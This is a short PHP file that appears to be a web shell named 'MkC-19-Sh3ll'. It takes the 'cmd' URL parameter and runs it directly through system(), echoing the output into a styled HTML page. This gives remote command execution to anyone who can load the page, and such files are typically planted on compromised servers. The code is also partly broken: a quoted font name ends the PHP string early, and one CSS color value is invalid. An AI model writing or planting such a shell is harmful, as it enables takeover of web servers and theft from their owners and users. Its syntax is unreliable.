<?php
$cmd = $_GET['cmd'];
echo '<!doctype HTML>
  <head>
      <title>MkC-19-Sh3ll</title>
      <style>
          body{color:black;
               background-color:rgb(74, 82, 60);
               font-family: 'Times New Roman', Times, serif;
               font-style: oblique;
            }
          h3{color:rgba( red, green, blue, alpha);
             background-attachment:scroll;
             background-color:forestgreen;
          }
          .command-output{
              background-color: black;
              color:green;
              padding: 5px;
              outline:5px solid #bbb;
          }

      </style>
    <body>
     <h3>Command Output</h3>
     <br/>
     <h3>MkC-19 Sh3ll</h3>
     <br/>
     <textarea class="command-output" cols="91" rows="25" readonly="true" spellcheck="false" style="margin: 0px; height: 357px; width: 783px;">';
system($cmd);
echo '</textarea>';
echo '</body></html>';
?>
